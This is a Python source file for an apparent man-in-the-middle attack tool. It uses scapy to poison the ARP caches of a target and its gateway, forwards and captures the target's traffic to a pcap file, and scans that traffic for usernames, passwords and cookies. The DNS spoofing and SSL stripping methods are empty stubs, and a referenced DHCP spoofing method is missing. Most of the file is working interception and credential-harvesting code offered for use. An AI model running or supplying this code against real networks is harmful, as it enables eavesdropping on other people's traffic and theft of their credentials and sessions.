from colorama import Fore, Style
import subprocess
import threading
import time
import os
import netifaces
from scapy.all import *
import logging

class MITMHandler:
    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self.capture_file = None
        self.arp_threads = []
        self.capture_thread = None
        self.gateway_ip = self.get_gateway_ip()
        self.target_ip = None
        self.packet_queue = []
        self.attack_modes = {
            'arp_spoof': self.start_arp_spoofing,
            'dns_spoof': self.start_dns_spoofing,
            'ssl_strip': self.start_ssl_stripping,
            'dhcp_spoof': self.start_dhcp_spoofing
        }
        
    def get_gateway_ip(self):
        """Get default gateway IP address"""
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting gateway IP: {str(e)}{Style.RESET_ALL}")
            return None

    def enable_ip_forwarding(self):
        """Enable IP forwarding on the system"""
        try:
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
            print(f"{Fore.GREEN}[+] IP forwarding enabled{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[!] Failed to enable IP forwarding: {str(e)}{Style.RESET_ALL}")
            return False

    def start_arp_spoofing(self, target_ip):
        """Start ARP spoofing attack"""
        self.target_ip = target_ip
        if not self.gateway_ip:
            print(f"{Fore.RED}[!] Gateway IP not found{Style.RESET_ALL}")
            return False

        print(f"{Fore.YELLOW}[*] Starting ARP spoofing attack...{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Target: {target_ip}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Gateway: {self.gateway_ip}{Style.RESET_ALL}")

        if not self.enable_ip_forwarding():
            return False

        self.running = True
        
        # Start two-way ARP spoofing
        target_thread = threading.Thread(target=self._arp_spoof, args=(target_ip, self.gateway_ip))
        gateway_thread = threading.Thread(target=self._arp_spoof, args=(self.gateway_ip, target_ip))
        
        self.arp_threads.extend([target_thread, gateway_thread])
        target_thread.start()
        gateway_thread.start()
        
        return True

    def _arp_spoof(self, target_ip, spoof_ip):
        """ARP spoofing implementation"""
        try:
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                print(f"{Fore.RED}[!] Could not get MAC address for {target_ip}{Style.RESET_ALL}")
                return

            arp_packet = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip
            )

            while self.running:
                try:
                    send(arp_packet, verbose=False)
                    time.sleep(2)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error in ARP spoofing: {str(e)}{Style.RESET_ALL}")

        except Exception as e:
            print(f"{Fore.RED}[!] ARP spoofing thread error: {str(e)}{Style.RESET_ALL}")

    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
            answer = srp1(arp_request, timeout=2, verbose=False)
            if answer:
                return answer[Ether].src
        except Exception as e:
            print(f"{Fore.RED}[!] Error getting MAC address: {str(e)}{Style.RESET_ALL}")
        return None

    def start_packet_capture(self, target_ip, output_dir="captures"):
        """Start packet capture with filtering and analysis"""
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)

        timestamp = time.strftime("%Y%m%d-%H%M%S")
        self.capture_file = f"{output_dir}/capture_{timestamp}.pcap"

        print(f"{Fore.YELLOW}[*] Starting packet capture for {target_ip}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Saving to: {self.capture_file}{Style.RESET_ALL}")

        # Start packet capture in a separate thread
        self.capture_thread = threading.Thread(
            target=self._packet_capture_worker,
            args=(target_ip,)
        )
        self.capture_thread.start()

    def _packet_capture_worker(self, target_ip):
        """Worker function for packet capture"""
        try:
            # Define capture filter
            capture_filter = f"host {target_ip}"
            
            def packet_callback(packet):
                if not self.running:
                    return
                
                if packet.haslayer(TCP) or packet.haslayer(UDP):
                    self.analyze_packet(packet)
                    
                # Save to pcap file
                wrpcap(self.capture_file, [packet], append=True)

            # Start sniffing
            sniff(
                iface=self.interface,
                filter=capture_filter,
                prn=packet_callback,
                store=0,
                stop_filter=lambda _: not self.running
            )

        except Exception as e:
            print(f"{Fore.RED}[!] Packet capture error: {str(e)}{Style.RESET_ALL}")

    def analyze_packet(self, packet):
        """Analyze captured packets for interesting content"""
        try:
            # Check for HTTP
            if packet.haslayer(TCP) and packet.haslayer(Raw):
                payload = packet[Raw].load.decode('utf-8', 'ignore')
                
                # Look for credentials
                if "password" in payload.lower() or "username" in payload.lower():
                    print(f"{Fore.GREEN}[+] Possible credentials found:{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")
                
                # Look for cookies
                if "cookie:" in payload.lower():
                    print(f"{Fore.GREEN}[+] Cookie found:{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}{payload}{Style.RESET_ALL}")

            # Check for FTP
            if packet.haslayer(FTP) or packet.haslayer(FTP_DATA):
                print(f"{Fore.GREEN}[+] FTP traffic detected:{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}{packet.summary()}{Style.RESET_ALL}")

        except Exception as e:
            pass  # Silently handle packet analysis errors

    def stop(self):
        """Stop all MITM activities"""
        print(f"{Fore.YELLOW}[*] Stopping MITM attack...{Style.RESET_ALL}")
        self.running = False
        
        # Stop ARP spoofing
        for thread in self.arp_threads:
            if thread.is_alive():
                thread.join()
        
        # Stop packet capture
        if self.capture_thread and self.capture_thread.is_alive():
            self.capture_thread.join()
        
        # Restore ARP tables
        if self.target_ip and self.gateway_ip:
            self.restore_arp_tables()
        
        print(f"{Fore.GREEN}[+] MITM attack stopped{Style.RESET_ALL}")

    def restore_arp_tables(self):
        """Restore ARP tables to normal"""
        try:
            target_mac = self.get_mac(self.target_ip)
            gateway_mac = self.get_mac(self.gateway_ip)
            
            if target_mac and gateway_mac:
                # Restore target ARP table
                arp_packet = ARP(
                    op=2,
                    pdst=self.target_ip,
                    hwdst=target_mac,
                    psrc=self.gateway_ip,
                    hwsrc=gateway_mac
                )
                send(arp_packet, count=5, verbose=False)
                
                # Restore gateway ARP table
                arp_packet = ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    psrc=self.target_ip,
                    hwsrc=target_mac
                )
                send(arp_packet, count=5, verbose=False)
                
                print(f"{Fore.GREEN}[+] ARP tables restored{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error restoring ARP tables: {str(e)}{Style.RESET_ALL}")

    def start_dns_spoofing(self, target_ip, fake_dns=None):
        """Start DNS spoofing attack"""
        try:
            from netfilterqueue import NetfilterQueue
            
            def dns_spoof_callback(packet):
                # DNS spoofing logic here
                pass
            
            os.system('iptables -A FORWARD -j NFQUEUE --queue-num 1')
            queue = NetfilterQueue()
            queue.bind(1, dns_spoof_callback)
            queue.run()
            
        except Exception as e:
            print(f"{Fore.RED}[!] DNS spoofing error: {str(e)}{Style.RESET_ALL}")

    def start_ssl_stripping(self, target_ip):
        """Start SSL stripping attack"""
        try:
            # SSL stripping implementation
            pass
        except Exception as e:
            print(f"{Fore.RED}[!] SSL stripping error: {str(e)}{Style.RESET_ALL}")

    # ... Add more attack methods ...